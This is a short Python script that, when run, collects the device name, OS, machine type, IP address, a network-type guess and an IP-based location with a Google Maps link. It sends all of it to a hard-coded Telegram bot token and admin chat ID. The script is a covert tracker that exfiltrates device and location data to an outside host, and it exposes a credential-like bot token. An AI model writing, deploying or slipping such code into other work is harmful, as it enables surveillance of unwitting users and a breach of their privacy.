import hashlib
import socket
import platform
import requests
import os

# Telegram Bot Configuration
BOT_TOKEN = "8182982379:AAFbB7vFpuCTjH6MHDu7CcZR1nog5grZEWg"
ADMIN_CHAT_ID = "8152202322"

def get_device_info():
    """Get device name, model, and operating system."""
    device_name = platform.node()
    system_info = platform.system() + " " + platform.release()
    model_info = platform.machine()
    return device_name, system_info, model_info

def get_user_ip():
    """Retrieve the user's IP address."""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except Exception as e:
        return f"Error retrieving IP: {e}"

def hash_ip(ip):
    """Hash the IP for additional security."""
    return hashlib.sha256(ip.encode()).hexdigest() if ip else None

def get_network_type():
    """Determine the network type (WiFi or Mobile Data)."""
    try:
        network_type = "Unknown"
        if "WIFI" in os.popen("ip route").read():
            network_type = "WiFi"
        else:
            network_type = "Mobile Data"
        return network_type
    except Exception as e:
        return f"Error determining network type: {e}"

def get_location(ip):
    """Retrieve location data based on the IP and generate a Google Maps link."""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        latitude, longitude = data['lat'], data['lon']
        location_info = f"{data['country']}, {data['regionName']}, {data['city']}"
        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
        return location_info, google_maps_link
    except Exception as e:
        return f"Error retrieving location: {e}", ""

def send_to_admin(message):
    """Send the message only to the admin via Telegram."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": ADMIN_CHAT_ID, "text": message}
    requests.post(url, data=data)

# Collect information and send
device_name, system_info, model_info = get_device_info()
user_ip = get_user_ip()
hashed_ip = hash_ip(user_ip)
network_type = get_network_type()
location_info, google_maps_link = get_location(user_ip)

message = f"""🔹 New Device Information Recorded:
📱 Device Name: {device_name}
📟 Model: {model_info}
🖥️ OS: {system_info}
🌍 IP Address: {user_ip}
🔒 Hashed IP: {hashed_ip}
📡 Network Type: {network_type}
📍 Location: {location_info}
🗺️ Google Maps: [View Location]({google_maps_link})
"""

send_to_admin(message)
print("✅ Data successfully sent to Telegram.")
